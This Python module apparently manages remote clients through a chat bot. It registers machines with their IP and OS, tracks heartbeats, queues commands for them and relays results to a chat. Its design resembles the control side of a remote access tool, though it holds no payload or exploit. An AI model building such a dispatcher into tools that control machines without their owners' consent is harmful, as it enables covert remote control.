"""
Multi-Client Manager
"""

import time
import threading
from datetime import datetime

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.default_client = None
        self.command_queue = {}

    def register_client(self, client_id, ip=None, os_info=None):
        if client_id not in self.clients:
            self.clients[client_id] = {
                'id': client_id,
                'ip': ip or 'N/A',
                'os': os_info or 'Unknown',
                'status': 'online',
                'last_seen': datetime.now().isoformat()
            }
            self.command_queue[client_id] = []
            return True
        else:
            self.clients[client_id]['last_seen'] = datetime.now().isoformat()
            self.clients[client_id]['status'] = 'online'
            return False

    def get_client(self, client_id):
        return self.clients.get(client_id)

    def list_clients(self):
        return list(self.clients.values())

    def set_default_client(self, client_id):
        if client_id in self.clients:
            self.default_client = client_id
            return True
        return False

    def get_default_client(self):
        return self.default_client

    def queue_command(self, client_id, command, chat_id):
        if client_id not in self.command_queue:
            self.command_queue[client_id] = []
        self.command_queue[client_id].append({
            'command': command,
            'chat_id': chat_id,
            'timestamp': time.time()
        })

    def get_pending_commands(self, client_id):
        if client_id in self.command_queue:
            commands = self.command_queue[client_id]
            self.command_queue[client_id] = []
            return commands
        return []

    def handle_client_message(self, client_id, message, chat_id, bot):
        if message.startswith('REGISTER:'):
            parts = message[9:].split('|')
            ip = parts[0] if len(parts) > 0 else None
            os_info = parts[1] if len(parts) > 1 else None
            self.register_client(client_id, ip, os_info)
            bot.sendMessage(chat_id, f'✅ Client registered: `{client_id}`')

        elif message.startswith('RESULT:'):
            result = message[7:]
            bot.sendMessage(chat_id, f'📊 `{client_id}`:\n```\n{result}\n```', parse_mode='Markdown')

        elif message.startswith('HEARTBEAT:'):
            if client_id in self.clients:
                self.clients[client_id]['last_seen'] = datetime.now().isoformat()
                self.clients[client_id]['status'] = 'online'

    def execute_command(self, client_id, command, chat_id, bot):
        if client_id not in self.clients:
            bot.sendMessage(chat_id, f'[!] Client not found: {client_id}')
            return False

        self.queue_command(client_id, command, chat_id)
        bot.sendMessage(chat_id, f'📤 Command sent to `{client_id}`')
        return True